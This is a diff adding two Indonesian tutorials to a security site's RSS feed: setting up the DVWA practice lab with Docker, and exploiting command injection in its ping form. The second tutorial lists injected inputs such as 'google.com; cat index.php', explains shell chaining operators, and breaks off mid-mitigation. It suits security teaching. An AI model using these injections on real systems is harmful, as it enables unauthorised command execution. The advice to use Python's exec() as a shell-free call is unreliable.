@@ -243,6 +243,511 @@
     </item>
     
     <item>
+      <title>Instalasi Lab DVWA</title>
+      <link>https://nancynesia.com/docs/hacking/hacking_fundamentals/instalasi-lab-dvwa/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://nancynesia.com/docs/hacking/hacking_fundamentals/instalasi-lab-dvwa/</guid>
+      <description>
+        
+        
+        &lt;h2&gt;Apa itu DVWA?&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;apa-itu-dvwa&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#apa-itu-dvwa&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;DVWA atau Damn Vulnerable Web Application, merupakan web yang memang sengaja dibuat rentan untuk tujuan praktik hacking. Hacker pemula bisa belajar disini untuk menguji kemampuanya dengan mengeksplorasi kerentanan yang ada.&lt;/p&gt;
+&lt;h2&gt;Tujuan DVWA&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;tujuan-dvwa&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#tujuan-dvwa&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Tujuanya adalah untuk membuat area praktik hacking yang legal, karena web ini memang dengan sengaja dibuat untuk kebutuhan praktik cybersecurity. DVWA sendiri dibuat dengan berbagai macam tingkat kesulitan yang bisa di pilih saat didalam web nantinya.&lt;/p&gt;
+&lt;h2&gt;Cara Instalasi DVWA dengan Docker:&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;cara-instalasi-dvwa-dengan-docker&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#cara-instalasi-dvwa-dengan-docker&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Install Docker&lt;/strong&gt; terlebih dahulu jika belum terpasang. Langkahnya instalasi bisa ke web official &lt;a href=&#34;https://www.docker.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Docker&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Clone repository DVWA&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;pre&gt;&lt;code&gt;git clone https://github.com/digininja/DVWA.git&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Masuk ke folder DVWA&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;pre&gt;&lt;code&gt;cd DVWA&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Jalankan DVWA dengan Docker Compose&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;pre&gt;&lt;code&gt;docker compose up -d&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Akses DVWA&lt;/strong&gt; melalui browser di port yang disediakan (misalnya, &lt;code&gt;http://localhost&lt;/code&gt;).&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Login&lt;/strong&gt; menggunakan username &lt;code&gt;admin&lt;/code&gt; dan password &lt;code&gt;password&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Pastikan minimal setup check&lt;/strong&gt; sudah berhasil dan berwarna hijau, lalu klik &lt;strong&gt;&amp;ldquo;Create&amp;rdquo;&lt;/strong&gt; atau &lt;strong&gt;&amp;ldquo;Reset Database&amp;rdquo;&lt;/strong&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Setelah berhasil, Anda akan diarahkan ke halaman admin.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>Memahami Command Injection</title>
+      <link>https://nancynesia.com/docs/hacking/hacking_fundamentals/memahami-command-injection/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://nancynesia.com/docs/hacking/hacking_fundamentals/memahami-command-injection/</guid>
+      <description>
+        
+        
+        &lt;h2&gt;Apa itu Command Injection?&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;apa-itu-command-injection&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#apa-itu-command-injection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Command Injection&lt;/strong&gt; adalah kerentanan keamanan yang terjadi ketika suatu aplikasi menerima input dari pengguna dan mengeksekusi perintah sistem operasi tanpa melakukan validasi atau sanitasi yang memadai. Kerentanan ini memungkinkan penyerang untuk menyisipkan dan menjalankan perintah yang tidak diotorisasi pada server.&lt;/p&gt;
+&lt;p&gt;Command Injection berbeda dengan &lt;strong&gt;Insecure File Upload&lt;/strong&gt; atau &lt;strong&gt;Unrestricted File Upload&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Insecure File Upload:&lt;/strong&gt; Penyerang mengunggah file berbahaya yang kemudian dijalankan oleh server.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Command Injection:&lt;/strong&gt; Penyerang langsung menjalankan perintah sistem operasi melalui input yang disediakan aplikasi.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Contoh Situasi:&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;contoh-situasi&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#contoh-situasi&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Misalnya, pada sistem berbasis Debian, penyerang dapat menjalankan perintah-perintah seperti &lt;code&gt;ls&lt;/code&gt;, &lt;code&gt;cat&lt;/code&gt;, atau &lt;code&gt;id&lt;/code&gt; melalui kerentanan ini. Jika aplikasi tidak membatasi atau memvalidasi input, perintah-perintah ini dapat dijalankan oleh server.&lt;/p&gt;
+&lt;h2&gt;Demo di DVWA (Damn Vulnerable Web Application)&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;demo-di-dvwa-damn-vulnerable-web-application&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#demo-di-dvwa-damn-vulnerable-web-application&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;Langkah-langkah:&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;langkah-langkah&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#langkah-langkah&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Pastikan DVWA Security Level dalam keadaan &amp;ldquo;Low&amp;rdquo;:&lt;/strong&gt;
+&lt;img src=&#34;https://nancynesia.com/images/SetSecLow.png&#34; alt=&#34;Set Security Low&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Hal ini memastikan bahwa tidak ada mekanisme mitigasi yang diterapkan, sehingga kita bisa memahami cara kerentanan ini bekerja.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Buka Menu &lt;code&gt;Command Injection&lt;/code&gt;:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Navigasikan ke menu &amp;ldquo;Command Injection&amp;rdquo; di DVWA.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Uji Fitur dengan Input Standar:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Pada form &amp;ldquo;Ping a Device,&amp;rdquo; masukkan perintah sederhana seperti:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;google.com&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Hasilnya akan menampilkan output seperti menjalankan perintah &lt;code&gt;ping&lt;/code&gt; di shell Bash.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nancynesia.com/images/pingGoogle.png&#34; alt=&#34;Ping google.com&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Analisis Kode Sumber:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Jika Anda memeriksa kode sumber aplikasi, Anda akan menemukan logika seperti ini:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Untuk server Windows NT, menggunakan perintah &lt;code&gt;ping&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Untuk server UNIX, menggunakan perintah &lt;code&gt;ping -c 4&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nancynesia.com/images/SourceCommandInjection.png&#34; alt=&#34;SourceCI&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Eksploitasi Kerentanan:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Dengan memanfaatkan fakta bahwa sistem ini tidak memvalidasi input, kita dapat menjalankan beberapa perintah sekaligus menggunakan operator seperti:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;: Menjalankan perintah berikutnya jika perintah sebelumnya berhasil.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;||&lt;/code&gt;: Menjalankan perintah berikutnya jika perintah sebelumnya gagal.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;;&lt;/code&gt;: Menjalankan perintah secara berurutan tanpa peduli hasil perintah sebelumnya.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Contoh Input Berbahaya:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Masukkan salah satu perintah berikut untuk menguji kerentanan:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;google.com &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; id&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;https://nancynesia.com/images/CekID.png&#34; alt=&#34;Cek ID&#34; loading=&#34;lazy&#34; /&gt;
+Hasil: Menampilkan informasi user ID server, seperti &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;google.com &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; id&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;p&gt;Hasil: Menjalankan perintah &lt;code&gt;id&lt;/code&gt; jika &lt;code&gt;ping google.com&lt;/code&gt; gagal.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;google.com; id&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;p&gt;Hasil: Menjalankan &lt;code&gt;ping&lt;/code&gt; diikuti dengan &lt;code&gt;id&lt;/code&gt; terlepas dari keberhasilan perintah pertama.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;google.com; ls&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;https://nancynesia.com/images/CekDir.png&#34; alt=&#34;Cek Dir&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Hasil: Menampilkan daftar file di direktori kerja server.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;google.com; cat index.php&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;https://nancynesia.com/images/CatFile.png&#34; alt=&#34;Cat index&#34; loading=&#34;lazy&#34; /&gt;
+Hasil: Membaca isi file &lt;code&gt;index.php&lt;/code&gt; jika memiliki izin akses.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Dampak:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Dengan mengeksploitasi kerentanan ini, penyerang dapat:
+&lt;ul&gt;
+&lt;li&gt;Mengakses file sensitif.&lt;/li&gt;
+&lt;li&gt;Mengeksekusi perintah berbahaya.&lt;/li&gt;
+&lt;li&gt;Mengambil alih kontrol penuh server.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2&gt;Teknik dan Operator dalam Command Injection&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;teknik-dan-operator-dalam-command-injection&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#teknik-dan-operator-dalam-command-injection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;Operator Umum:&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;operator-umum&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#operator-umum&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;: Menjalankan perintah berikutnya jika perintah sebelumnya berhasil.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;||&lt;/code&gt;: Menjalankan perintah berikutnya jika perintah sebelumnya gagal.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;;&lt;/code&gt;: Menjalankan perintah secara berurutan tanpa memperhatikan hasil.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;|&lt;/code&gt;: Mengalihkan output dari perintah pertama sebagai input untuk perintah kedua (pipe).&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;`&lt;/code&gt;: Menjalankan perintah di dalam backticks.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;$()&lt;/code&gt;: Substitusi perintah, menjalankan perintah di dalam kurung.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Langkah Mitigasi&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;langkah-mitigasi&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#langkah-mitigasi&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Validasi dan Sanitasi Input:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Gunakan whitelist untuk input yang diizinkan.&lt;/li&gt;
+&lt;li&gt;Escape karakter khusus seperti &lt;code&gt;;&lt;/code&gt;, &lt;code&gt;|&lt;/code&gt;, &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;, dan &lt;code&gt;||&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Hindari Eksekusi Perintah Shell Secara Langsung:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Gunakan fungsi API yang tidak mengeksekusi shell secara langsung, seperti &lt;code&gt;exec()&lt;/code&gt; dengan parameter terpisah di Python.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Batasi Hak Akses:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Jalankan aplikasi dengan hak akses minimum (misalnya, pengguna non-root).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Gunakan WAF (Web Application Firewall):&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
